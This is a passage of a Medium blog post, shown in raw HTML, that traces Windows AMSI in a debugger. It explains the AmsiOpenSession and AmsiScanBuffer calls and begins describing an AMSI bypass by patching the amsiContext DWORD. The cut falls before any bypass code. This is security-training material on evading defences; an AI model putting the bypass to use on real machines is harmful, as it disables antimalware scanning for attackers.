(min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 660px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*wxs9luiAkSIne5nz.png 640w, https://miro.medium.com/v2/resize:fit:720/0*wxs9luiAkSIne5nz.png 720w, https://miro.medium.com/v2/resize:fit:750/0*wxs9luiAkSIne5nz.png 750w, https://miro.medium.com/v2/resize:fit:786/0*wxs9luiAkSIne5nz.png 786w, https://miro.medium.com/v2/resize:fit:828/0*wxs9luiAkSIne5nz.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*wxs9luiAkSIne5nz.png 1100w, https://miro.medium.com/v2/resize:fit:1320/0*wxs9luiAkSIne5nz.png 1320w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 660px"><img alt="" class="be lp or c" width="660" height="84" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:825/0*wxs9luiAkSIne5nz.png"></picture></div></figure><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of pa"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*WtW3XzIaqT6TpVcG.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*WtW3XzIaqT6TpVcG.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*WtW3XzIaqT6TpVcG.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*WtW3XzIaqT6TpVcG.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*WtW3XzIaqT6TpVcG.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*WtW3XzIaqT6TpVcG.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*WtW3XzIaqT6TpVcG.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*WtW3XzIaqT6TpVcG.png 640w, https://miro.medium.com/v2/resize:fit:720/0*WtW3XzIaqT6TpVcG.png 720w, https://miro.medium.com/v2/resize:fit:750/0*WtW3XzIaqT6TpVcG.png 750w, https://miro.medium.com/v2/resize:fit:786/0*WtW3XzIaqT6TpVcG.png 786w, https://miro.medium.com/v2/resize:fit:828/0*WtW3XzIaqT6TpVcG.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*WtW3XzIaqT6TpVcG.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*WtW3XzIaqT6TpVcG.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="71" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*WtW3XzIaqT6TpVcG.png"></picture></div></div></figure><p id="c90c" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">At this time, we have not executed any script, and the powershell banner is not even loaded.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div class="oe of pb"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*gdrOZezkU7pw3ifM.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*gdrOZezkU7pw3ifM.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*gdrOZezkU7pw3ifM.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*gdrOZezkU7pw3ifM.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*gdrOZezkU7pw3ifM.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*gdrOZezkU7pw3ifM.png 1100w, https://miro.medium.com/v2/resize:fit:1370/format:webp/0*gdrOZezkU7pw3ifM.png 1370w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 685px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*gdrOZezkU7pw3ifM.png 640w, https://miro.medium.com/v2/resize:fit:720/0*gdrOZezkU7pw3ifM.png 720w, https://miro.medium.com/v2/resize:fit:750/0*gdrOZezkU7pw3ifM.png 750w, https://miro.medium.com/v2/resize:fit:786/0*gdrOZezkU7pw3ifM.png 786w, https://miro.medium.com/v2/resize:fit:828/0*gdrOZezkU7pw3ifM.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*gdrOZezkU7pw3ifM.png 1100w, https://miro.medium.com/v2/resize:fit:1370/0*gdrOZezkU7pw3ifM.png 1370w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 685px"><img alt="" class="be lp or c" width="685" height="166" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:856/0*gdrOZezkU7pw3ifM.png"></picture></div></figure><p id="42f1" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Continue the execution, we hit breakpoints at the entry of functions <strong class="ni gs">AmsiOpenSession </strong>and <strong class="ni gs">AmsiScanBuffer, </strong>respectively.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div class="oe of pc"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*AzR0xp_sVnqTTCpy.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*AzR0xp_sVnqTTCpy.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*AzR0xp_sVnqTTCpy.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*AzR0xp_sVnqTTCpy.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*AzR0xp_sVnqTTCpy.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*AzR0xp_sVnqTTCpy.png 1100w, https://miro.medium.com/v2/resize:fit:1392/format:webp/0*AzR0xp_sVnqTTCpy.png 1392w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 696px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*AzR0xp_sVnqTTCpy.png 640w, https://miro.medium.com/v2/resize:fit:720/0*AzR0xp_sVnqTTCpy.png 720w, https://miro.medium.com/v2/resize:fit:750/0*AzR0xp_sVnqTTCpy.png 750w, https://miro.medium.com/v2/resize:fit:786/0*AzR0xp_sVnqTTCpy.png 786w, https://miro.medium.com/v2/resize:fit:828/0*AzR0xp_sVnqTTCpy.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*AzR0xp_sVnqTTCpy.png 1100w, https://miro.medium.com/v2/resize:fit:1392/0*AzR0xp_sVnqTTCpy.png 1392w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 696px"><img alt="" class="be lp or c" width="696" height="164" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:870/0*AzR0xp_sVnqTTCpy.png"></picture></div></figure><p id="0047" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Now, the banner is loaded, and we can supply the script.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of pd"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*zslt0tsd2GjCs2QC.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*zslt0tsd2GjCs2QC.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*zslt0tsd2GjCs2QC.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*zslt0tsd2GjCs2QC.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*zslt0tsd2GjCs2QC.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*zslt0tsd2GjCs2QC.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*zslt0tsd2GjCs2QC.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*zslt0tsd2GjCs2QC.png 640w, https://miro.medium.com/v2/resize:fit:720/0*zslt0tsd2GjCs2QC.png 720w, https://miro.medium.com/v2/resize:fit:750/0*zslt0tsd2GjCs2QC.png 750w, https://miro.medium.com/v2/resize:fit:786/0*zslt0tsd2GjCs2QC.png 786w, https://miro.medium.com/v2/resize:fit:828/0*zslt0tsd2GjCs2QC.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*zslt0tsd2GjCs2QC.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*zslt0tsd2GjCs2QC.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="132" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*zslt0tsd2GjCs2QC.png"></picture></div></div></figure><p id="d425" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">In summary, though the process of loading AMSI may involve more steps and be more complex, we know AmsiInitialize is called first, then AmsiOpenSession, and AmsiScanBuffer.</p><p id="67e8" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Let’s supply malicious content “<strong class="ni gs">invoke-mimikatz”</strong>, and inspect the calling of these functions.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of pe"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*IkCvULhtK5YV7Ij2.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*IkCvULhtK5YV7Ij2.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*IkCvULhtK5YV7Ij2.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*IkCvULhtK5YV7Ij2.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*IkCvULhtK5YV7Ij2.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*IkCvULhtK5YV7Ij2.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*IkCvULhtK5YV7Ij2.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*IkCvULhtK5YV7Ij2.png 640w, https://miro.medium.com/v2/resize:fit:720/0*IkCvULhtK5YV7Ij2.png 720w, https://miro.medium.com/v2/resize:fit:750/0*IkCvULhtK5YV7Ij2.png 750w, https://miro.medium.com/v2/resize:fit:786/0*IkCvULhtK5YV7Ij2.png 786w, https://miro.medium.com/v2/resize:fit:828/0*IkCvULhtK5YV7Ij2.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*IkCvULhtK5YV7Ij2.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*IkCvULhtK5YV7Ij2.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="122" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*IkCvULhtK5YV7Ij2.png"></picture></div></div></figure><p id="e4a8" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">When inspecting script content, AmsiInitialize is not called, but AmsiOpenSession and AmsiScanBuffer are still called in order. The calling order is not surprising, as the function names are self-explanatory.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of pf"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*aDJQ9WmQDqOUPFZC.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*aDJQ9WmQDqOUPFZC.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*aDJQ9WmQDqOUPFZC.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*aDJQ9WmQDqOUPFZC.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*aDJQ9WmQDqOUPFZC.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*aDJQ9WmQDqOUPFZC.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*aDJQ9WmQDqOUPFZC.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*aDJQ9WmQDqOUPFZC.png 640w, https://miro.medium.com/v2/resize:fit:720/0*aDJQ9WmQDqOUPFZC.png 720w, https://miro.medium.com/v2/resize:fit:750/0*aDJQ9WmQDqOUPFZC.png 750w, https://miro.medium.com/v2/resize:fit:786/0*aDJQ9WmQDqOUPFZC.png 786w, https://miro.medium.com/v2/resize:fit:828/0*aDJQ9WmQDqOUPFZC.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*aDJQ9WmQDqOUPFZC.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*aDJQ9WmQDqOUPFZC.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="104" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*aDJQ9WmQDqOUPFZC.png"></picture></div></div></figure><p id="ae67" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Finally, the script content is regarded as malicious.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of pg"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*rZJNV64TPPAzZ1Zc.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*rZJNV64TPPAzZ1Zc.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*rZJNV64TPPAzZ1Zc.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*rZJNV64TPPAzZ1Zc.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*rZJNV64TPPAzZ1Zc.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*rZJNV64TPPAzZ1Zc.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*rZJNV64TPPAzZ1Zc.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*rZJNV64TPPAzZ1Zc.png 640w, https://miro.medium.com/v2/resize:fit:720/0*rZJNV64TPPAzZ1Zc.png 720w, https://miro.medium.com/v2/resize:fit:750/0*rZJNV64TPPAzZ1Zc.png 750w, https://miro.medium.com/v2/resize:fit:786/0*rZJNV64TPPAzZ1Zc.png 786w, https://miro.medium.com/v2/resize:fit:828/0*rZJNV64TPPAzZ1Zc.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*rZJNV64TPPAzZ1Zc.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*rZJNV64TPPAzZ1Zc.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="123" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*rZJNV64TPPAzZ1Zc.png"></picture></div></div></figure><p id="5e15" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">To understand the process better, let’s inspect these functions.</p><p id="c86a" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Function AmsiInitialize has <strong class="ni gs">2</strong> arguments, after the execution, the argument <strong class="ni gs">amsiContext</strong> will be initialized. It is a handle of type <strong class="ni gs">HAMSICONTEXT</strong> that will be passed to all subsequent calls to the AMSI API.</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="8a3f" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph=""><span class="hljs-function">HRESULT <span class="hljs-title">AmsiInitialize</span><span class="hljs-params">(<br>[in] LPCWSTR appName,<br>[out] HAMSICONTEXT *amsiContext<br>)</span></span>;</span></pre><p id="453e" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Function AmsiOpenSession has 2 arguments, either. The 1st argument is amsiContext, which is initialized from the function AmsiInitialize. After the execution, <strong class="ni gs">amsiSession </strong>will be initialized. It is a handle of type <strong class="ni gs">HAMSISESSION </strong>that will be passed to all subsequent calls to the AMSI API within the session.</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="0554" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph=""><span class="hljs-function">HRESULT <span class="hljs-title">AmsiOpenSession</span><span class="hljs-params">(<br>[in] HAMSICONTEXT amsiContext,<br>[out] HAMSISESSION *amsiSession<br>)</span></span>;</span></pre><p id="903f" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Function AmsiScanBuffer has 6 arguments, including previously initialized amsiContext and amsiSession. Other arguments include the script content, the length of the content, the content ID, and the scan result. The value of argument result will be set after the execution.</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="02ca" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph=""><span class="hljs-function">HRESULT <span class="hljs-title">AmsiScanBuffer</span><span class="hljs-params">(<br>[in] HAMSICONTEXT amsiContext,<br>[in] PVOID buffer,<br>[in] ULONG length,<br>[in] LPCWSTR contentName,<br>[in, optional] HAMSISESSION amsiSession,<br>[out] AMSI_RESULT *result<br>)</span></span>;</span></pre><p id="8f82" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">According to the result value, scanned script could be considered malicious or clean. <strong class="ni gs">AMSI_RESULT_CLEAN </strong>is <strong class="ni gs">1</strong>, <strong class="ni gs">AMSI_RESULT_DETECTED </strong>is <strong class="ni gs">32767.</strong></p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="f12e" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph=""><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> <span class="hljs-title.class">AMSI_RESULT</span> {<br>AMSI_RESULT_CLEAN,<br>AMSI_RESULT_NOT_DETECTED,<br>AMSI_RESULT_BLOCKED_BY_ADMIN_START,<br>AMSI_RESULT_BLOCKED_BY_ADMIN_END,<br>AMSI_RESULT_DETECTED<br>} ;</span></pre><p id="f74c" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Armed with background knowledge, let’s discuss how to bypass AMSI by attacking these functions.</p><h1 id="330b" class="mi mj gr bc mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf bh" data-selectable-paragraph="">Attack AmsiOpenSession</h1><p id="4ae7" class="pw-post-body-paragraph ng nh gr ni b nj nk nl nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od gk bh" data-selectable-paragraph="">In OSEP, the bypass method is to patch the first <strong class="ni gs">DWORD</strong> pointed by amsiContext. The following screenshot is the graph view of AmsiOpenSession on <strong class="ni gs">Windows Server 2019</strong>. As we can see, the first DWORD is compared to “<strong class="ni gs">AMSI</strong>“.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of pq"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*zYCI0v1wQkrbhM2Y.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*zYCI0v1wQkrbhM2Y.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*zYCI0v1wQkrbhM2Y.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*zYCI0v1wQkrbhM2Y.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*zYCI0v1wQkrbhM2Y.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*zYCI0v1wQkrbhM2Y.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*zYCI0v1wQkrbhM2Y.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*zYCI0v1wQkrbhM2Y.png 640w, https://miro.medium.com/v2/resize:fit:720/0*zYCI0v1wQkrbhM2Y.png 720w, https://miro.medium.com/v2/resize:fit:750/0*zYCI0v1wQkrbhM2Y.png 750w, https://miro.medium.com/v2/resize:fit:786/0*zYCI0v1wQkrbhM2Y.png 786w, https://miro.medium.com/v2/resize:fit:828/0*zYCI0v1wQkrbhM2Y.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*zYCI0v1wQkrbhM2Y.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*zYCI0v1wQkrbhM2Y.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="560" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*zYCI0v1wQkrbhM2Y.png"></picture></div></div></figure><p id="1d53" 